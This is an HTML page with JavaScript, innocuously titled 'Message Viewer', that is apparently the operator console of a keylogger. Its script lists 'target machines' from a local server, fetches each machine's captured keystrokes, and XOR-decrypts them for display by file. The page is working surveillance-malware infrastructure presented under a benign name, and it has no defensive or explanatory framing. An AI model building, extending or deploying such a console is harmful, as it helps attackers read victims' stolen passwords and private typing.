<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Message Viewer</title>
  <style>
    /* Body and animated gradient background */
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: linear-gradient(270deg, #4f46e5, #06b6d4, #4f46e5);
      background-size: 600% 600%;
      animation: gradientBG 12s ease infinite;
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* App container */
    .app {
      background: #fff;
      border-radius: 16px;
      padding: 24px;
      box-shadow: 0 12px 30px rgba(0,0,0,0.2);
      width: 400px;
      max-width: 95%;
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Headings */
    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #1e293b;
    }

    /* Labels and inputs */
    label { display: block; margin-top: 10px; font-weight: bold; }
    select, input {
      width: 100%; padding: 10px; margin-top: 5px;
      border: 1px solid #ccc; border-radius: 8px;
      font-size: 0.95rem;
    }

    /* Button with gradient animation */
    button {
      margin-top: 15px; width: 100%; padding: 12px;
      border: none; border-radius: 8px;
      font-weight: bold; color: #fff; font-size: 1rem;
      cursor: pointer;
      background: linear-gradient(270deg, #6366f1, #06b6d4, #6366f1);
      background-size: 400% 400%;
      animation: gradientBtn 5s ease infinite;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
    }

    @keyframes gradientBtn {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Output box */
    .output {
      margin-top: 15px; background: #f9fafb;
      border: 1px solid #e2e8f0; border-radius: 8px;
      padding: 12px; min-height: 80px; font-family: monospace;
      white-space: pre-wrap;
      animation: fadeIn 0.8s ease;
    }
  </style>
</head>
<body>
  <div class="app">
    <h1>Message Viewer</h1>

    <label for="sourceSelect">Select Source:</label>
    <select id="sourceSelect"></select>

    <label for="key">Decryption Key:</label>
    <input type="text" id="key" placeholder="Enter key">

    <button id="fetchBtn">Fetch Messages</button>

    <div id="output" class="output"></div>
  </div>

  <script>
    const SERVER_URL = "http://127.0.0.1:5000";

    // XOR decryption
    function xorDecrypt(arr, key) {
      let res = "";
      for (let i = 0; i < arr.length; i++) {
        res += String.fromCharCode(arr[i] ^ key.charCodeAt(i % key.length));
      }
      return res;
    }

    // Load sources
    async function loadSources() {
      try {
        const res = await fetch(`${SERVER_URL}/api/get_target_machines_list/`);
        const sources = await res.json();
        const select = document.getElementById("sourceSelect");
        select.innerHTML = "";
        sources.forEach(src => {
          const opt = document.createElement("option");
          opt.value = src;
          opt.textContent = src;
          select.appendChild(opt);
        });
      } catch (e) {
        alert("Failed to load sources: " + e);
      }
    }

    // Fetch and decrypt messages
    async function fetchAndDecryptLogs() {
      const select = document.getElementById('sourceSelect');
      const key = document.getElementById('key').value;
      const machine = select.value;

      if (!key) {
        alert("Please enter a decryption key!");
        return;
      }

      try {
        const response = await fetch(`${SERVER_URL}/api/get_keystrokes_machine/${machine}`);
        if (!response.ok) throw new Error("Source not found or server error");
        const data = await response.json();

        let output = '';
        for (const [filename, encrypted] of Object.entries(data[machine])) {
          const encryptedArray = JSON.parse(encrypted); // array of numbers
          const decrypted = xorDecrypt(encryptedArray, key);
          output += `File: ${filename}\n${decrypted}\n\n`;
        }

        document.getElementById('output').textContent = output;

      } catch (e) {
        alert("Error fetching messages: " + e.message);
      }
    }

    document.getElementById('fetchBtn').addEventListener('click', fetchAndDecryptLogs);

    loadSources();
  </script>
</body>
</html>
